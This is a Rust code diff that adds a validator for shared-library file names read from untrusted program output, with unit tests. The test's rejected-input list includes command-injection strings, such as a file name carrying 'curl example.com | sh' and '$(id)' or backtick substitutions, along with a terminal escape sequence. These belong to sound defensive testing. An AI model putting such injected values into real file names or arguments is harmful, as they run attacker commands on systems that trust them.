@@ -241,9 +241,147 @@ const fn hex_nibble(byte: u8) -> Option<u8> {
     }
 }
 
+/// The longest shared-library file name accepted, in bytes.
+pub const MAX_SHARED_LIBRARY_NAME_BYTES: usize = 64;
+
+/// The file name of a shared library, such as `libgomp.so.1`, validated so it
+/// can be shown to a person and put into fixed prose.
+///
+/// A program that cannot start because a library is missing says so on its own
+/// standard error, which is untrusted text (a tool the user did not write, or
+/// one a hostile archive replaced). Only a name that passes [`Self::parse`] is
+/// ever carried further: ASCII, `lib` then a stem of letters, digits, `_`, `+`
+/// and `-`, then `.so`, then at most three numeric version parts, at most
+/// [`MAX_SHARED_LIBRARY_NAME_BYTES`] bytes in all. It holds no path, no space,
+/// no punctuation a shell or a terminal acts on.
+///
+/// The value is `Copy` (a fixed buffer) so the failure types that carry it
+/// stay `Copy`.
+#[derive(Clone, Copy, Eq, PartialEq)]
+pub struct SharedLibraryName {
+    bytes: [u8; MAX_SHARED_LIBRARY_NAME_BYTES],
+    length: u8,
+}
+
+impl SharedLibraryName {
+    /// Validates `candidate`, or returns `None` for anything that is not a
+    /// plain library file name.
+    #[must_use]
+    pub fn parse(candidate: &str) -> Option<Self> {
+        if candidate.is_empty() || candidate.len() > MAX_SHARED_LIBRARY_NAME_BYTES {
+            return None;
+        }
+        let rest = candidate.strip_prefix("lib")?;
+        let (stem, versions) = rest.split_once(".so")?;
+        let stem_ok = !stem.is_empty()
+            && stem
+                .bytes()
+                .all(|byte| byte.is_ascii_alphanumeric() || matches!(byte, b'_' | b'+' | b'-'));
+        let versions_ok = versions.is_empty()
+            || versions.strip_prefix('.').is_some_and(|parts| {
+                let parts: Vec<&str> = parts.split('.').collect();
+                parts.len() <= 3
+                    && parts.iter().all(|part| {
+                        (1..=6).contains(&part.len())
+                            && part.bytes().all(|byte| byte.is_ascii_digit())
+                    })
+            });
+        if !stem_ok || !versions_ok {
+            return None;
+        }
+        let mut bytes = [0_u8; MAX_SHARED_LIBRARY_NAME_BYTES];
+        bytes[..candidate.len()].copy_from_slice(candidate.as_bytes());
+        Some(Self {
+            bytes,
+            length: u8::try_from(candidate.len()).ok()?,
+        })
+    }
+
+    /// The validated file name.
+    #[must_use]
+    pub fn as_str(&self) -> &str {
+        // The bytes were validated as ASCII, so the conversion cannot fail; an
+        // empty name is the harmless answer to an impossible state.
+        std::str::from_utf8(&self.bytes[..usize::from(self.length)]).unwrap_or_default()
+    }
+}
+
+impl fmt::Debug for SharedLibraryName {
+    fn fmt(&self, formatter: &mut fmt::Formatter<'_>) -> fmt::Result {
+        formatter
+            .debug_tuple("SharedLibraryName")
+            .field(&self.as_str())
+            .finish()
+    }
+}
+
+impl fmt::Display for SharedLibraryName {
+    fn fmt(&self, formatter: &mut fmt::Formatter<'_>) -> fmt::Result {
+        formatter.write_str(self.as_str())
+    }
+}
+
 #[cfg(test)]
 mod tests {
-    use super::{ArtifactIntegrity, ArtifactIntegrityError, MAX_MANAGED_ARTIFACT_BYTES};
+    use super::{
+        ArtifactIntegrity, ArtifactIntegrityError, MAX_MANAGED_ARTIFACT_BYTES,
+        MAX_SHARED_LIBRARY_NAME_BYTES, SharedLibraryName,
+    };
+
+    #[test]
+    fn plain_library_file_names_are_accepted_and_nothing_else() {
+        for accepted in [
+            "libgomp.so.1",
+            "libstdc++.so.6",
+            "libc.so.6",
+            "libm.so.6",
+            "libssl.so.3",
+            "libfoo-bar_baz.so",
+            "libfoo.so.1.2.3",
+        ] {
+            let parsed = SharedLibraryName::parse(accepted);
+            assert_eq!(
+                parsed.as_ref().map(SharedLibraryName::as_str),
+                Some(accepted)
+            );
+        }
+        let too_long = format!("lib{}.so.1", "a".repeat(MAX_SHARED_LIBRARY_NAME_BYTES));
+        for refused in [
+            "",
+            "gomp.so.1",
+            "lib.so.1",
+            "libgomp",
+            "libgomp.so.",
+            "libgomp.so..1",
+            "libgomp.so.1.2.3.4",
+            "libgomp.so.1234567",
+            "libgomp.so.1a",
+            "libgomp.so.x",
+            "/usr/lib/libgomp.so.1",
+            "..\\libgomp.so.1",
+            "libgomp.so.1 ",
+            " libgomp.so.1",
+            "libgomp.so.1; curl example.com | sh",
+            "libgomp.so.1\n",
+            "libgomp.so.1\u{1b}[31m",
+            "libg\u{f6}mp.so.1",
+            "libgomp$(id).so.1",
+            "libgomp`id`.so.1",
+            "lib gomp.so.1",
+            too_long.as_str(),
+        ] {
+            assert_eq!(SharedLibraryName::parse(refused), None, "{refused:?}");
+        }
+    }
+
+    #[test]
+    fn a_name_at_the_bound_is_accepted_and_one_byte_more_is_not() {
+        let stem = "a".repeat(MAX_SHARED_LIBRARY_NAME_BYTES - "lib.so".len());
+        let at_bound = format!("lib{stem}.so");
+        assert_eq!(at_bound.len(), MAX_SHARED_LIBRARY_NAME_BYTES);
+        assert!(SharedLibraryName::parse(&at_bound).is_some());
+        assert!(SharedLibraryName::parse(&format!("a{at_bound}")).is_none());
+    }
 
     #[test]
     fn requires_bounded_size_and_canonical_digest() -> Result<(), ArtifactIntegrityError> {
